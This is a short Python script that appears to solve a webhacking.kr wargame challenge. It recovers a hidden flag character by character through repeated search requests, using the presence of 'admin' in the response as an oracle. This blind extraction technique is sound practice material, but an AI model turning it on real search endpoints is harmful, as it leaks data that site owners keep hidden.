import requests

url = 'https://webhacking.kr/challenge/web-33/'
data = {
    'search' : ''
}
cookies = {
    'PHPSESSID' : 'your_phpsessid'
}
dictionary = 'abcdefghijklmnopqrstuvwxyz?1234567890{}_'
# search = 'flag{'
search = ''

for _ in range(1, 100):
    flag = 0
    for letter in dictionary:
        data['search'] = search + letter
        print(data['search'])
        response = requests.post(url, cookies=cookies, data=data)

        if 'admin' in response.text:
            search += letter
            flag = 1
            break

    if flag is 0:
        break

print(search)